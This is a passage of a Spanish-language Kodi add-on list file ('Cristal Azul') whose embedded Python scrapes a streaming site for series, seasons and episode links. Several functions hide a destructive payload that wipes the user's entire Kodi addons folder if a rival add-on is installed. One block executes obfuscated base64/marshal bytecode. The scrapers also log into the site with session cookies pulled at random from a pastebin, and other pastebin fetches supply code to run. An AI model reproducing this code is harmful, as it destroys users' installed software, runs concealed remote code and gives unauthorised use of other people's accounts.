<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]sERIES [COLOR white]PRODUCTORAS[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
def GetLSProData(page_data,Cookie_Jar,m):#CpRdIsSaTvAmL
  response = requests.get('https://pastebin.com/raw/mRDFTn7Y', verify=False).text
  items = re.findall('(?s)"titulo":"(.*?)".*?"url":"(.*?)".*?"imagen":"(.*?)"', response)
  numero_total = len(items)
  return [('[COLOR aqua]Cristal Azul, Productoras:[COLOR white] ('+str(numero_total)+')', ' ', 'https://i.imgur.com/5kY0BRB.png')] + sorted(items) + [('[COLOR white]No hay mas resultados...', ' ', 'https://i.imgur.com/5kY0BRB.png')]
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,url=url):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)"item movies">.*?href="(.*?)".*?src="(.*?)".*?alt="(.*?)".*?p>(.*?)<.*?span>.(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
        response = six.ensure_str(response)
        data = re.findall(patron, response)
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
            response = six.ensure_str(response)
            data = re.findall(patron, response)
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            return [(' ', 'https://i.imgur.com/r6aXooD.jpg', ' ', '[COLOR white]Web en Mantenimiento', ' ')]
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        titulo = item[2]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        anio = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
